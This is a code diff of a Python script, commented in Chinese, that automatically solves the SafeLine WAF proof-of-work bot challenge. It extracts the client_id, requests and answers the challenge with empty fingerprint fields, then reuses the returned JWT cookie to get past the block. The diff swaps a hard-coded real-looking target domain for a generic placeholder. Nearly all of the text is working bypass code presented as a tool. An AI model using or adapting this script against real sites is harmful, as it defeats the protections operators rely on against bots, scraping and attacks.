@@ -5,9 +5,11 @@
 =======================================
 """
 import requests, re, sys, json
+from urllib.parse import urlparse
 
-URL = sys.argv[1] if len(sys.argv) > 1 else "http://y.idc129.net/"
-BASE = URL.rstrip("/")
+URL = sys.argv[1] if len(sys.argv) > 1 else "目标"
+PARSED = urlparse(URL)
+ORIGIN = f"{PARSED.scheme}://{PARSED.netloc}"
 
 
 def calc(data):
@@ -30,7 +32,7 @@ s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit
 print(f"目标: {URL}")
 
 # 触发拦截 
-r1 = s.get(BASE, timeout=15)
+r1 = s.get(ORIGIN, timeout=15)
 print(f"绕过前: HTTP {r1.status_code} (468=被拦)")
 
 m = re.search(r'SafeLineChallenge\("([^"]+)"', r1.text)
@@ -39,7 +41,7 @@ client_id = m.group(1)
 print(f"client_id: {client_id}")
 
 # 请求 PoW 数据
-r2 = s.post(f"{BASE}/.safeline/challenge/v2/api/issue",
+r2 = s.post(f"{ORIGIN}/.safeline/challenge/v2/api/issue",
             json={"client_id": client_id, "level": 1}, timeout=15)
 d = r2.json()["data"]
 print(f"issue_id: {d['issue_id']}")
@@ -49,7 +51,7 @@ result = calc(d["data"])
 print(f"result: {result}")
 
 # 提交验证
-r4 = s.post(f"{BASE}/.safeline/challenge/v2/api/verify",
+r4 = s.post(f"{ORIGIN}/.safeline/challenge/v2/api/verify",
             json={"issue_id": d["issue_id"], "result": result, "serials": [],
                   "client": {"userAgent": "", "platform": "", "language": "", "vendor": "",
                              "screen": [0, 0], "visitorId": "", "score": 0, "target": []}},
@@ -61,7 +63,7 @@ print(f"verify: True  JWT: {jwt[:50]}...")
 s.cookies.set("sl-challenge-jwt", jwt, path="/")
 s.cookies.set("sl-challenge-server", "local", path="/")
 
-r5 = s.get(BASE, timeout=15)
+r5 = s.get(ORIGIN, timeout=15)
 ok = r5.status_code != 468 and "SafeLineChallenge" not in r5.text
 print(f"绕过后: HTTP {r5.status_code} [{'成功' if ok else '失败'}]")
 if ok:
